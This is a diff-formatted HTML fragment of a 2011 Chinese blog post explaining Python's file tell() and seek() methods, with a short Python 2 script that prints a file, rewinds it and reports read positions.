+	<div class="entry-content">
+		<p>对于一个<a title="file" href="http://www.youth2009.org/tag/file/">file</a>，调用<a title="tell" href="http://www.youth2009.org/tag/tell/">tell</a>能够知道现在的文件位置。<a title="seek" href="http://www.youth2009.org/tag/seek/">seek</a>是改变文件位置。  比如文件中有3行句子，readline后位置就到了第一行的最后，再readline就到了第二行的最后，readline后我调用了tell，看到的结果就是这样的。输出完<a title="tell" href="http://www.youth2009.org/tag/tell/">tell</a>我又使用了<a title="seek" href="http://www.youth2009.org/tag/seek/">seek</a>(0),这样文件位置就回到开头了，下次再调用readline就会输出原来第一行的内容了，这应该是很容易理解的。不明白可以亲自试试。</p>
+
+<pre class="prettyprint linenums bush:python" lang="python">from sys import argv
+
+script, input_file = argv
+
+def print_all(f):
+   print f.read()
+
+def rewind(f):
+   f.seek(0)
+
+def print_a_line(line_count, f):
+   print line_count, f.readline()
+
+current_file = open(input_file)
+
+print "First let's print the while file:\n"
+print_all(current_file)
+
+print "Now let's rewind, kind of like a tape."
+rewind(current_file)
+
+print "Let's print three lines:"
+
+current_line = 1
+print_a_line(current_line, current_file)
+print "current_pos:%d" % current_file.tell()
+rewind(current_file)
+
+current_line += 1
+print_a_line(current_line, current_file)
+print "current_pos:%d" % current_file.tell()
+
+current_line += 1
+print_a_line(current_line, current_file)
+print "current_pos:%d" % current_file.tell()
+</pre>
+
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-09T15:12:00+08:00" pubdate data-updated="true">Jul 9<span>th</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/file/'>file</a>, <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/seek/'>seek</a>, <a class='category' href='/blog/categories/tell/'>tell</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
 
 
 </div>
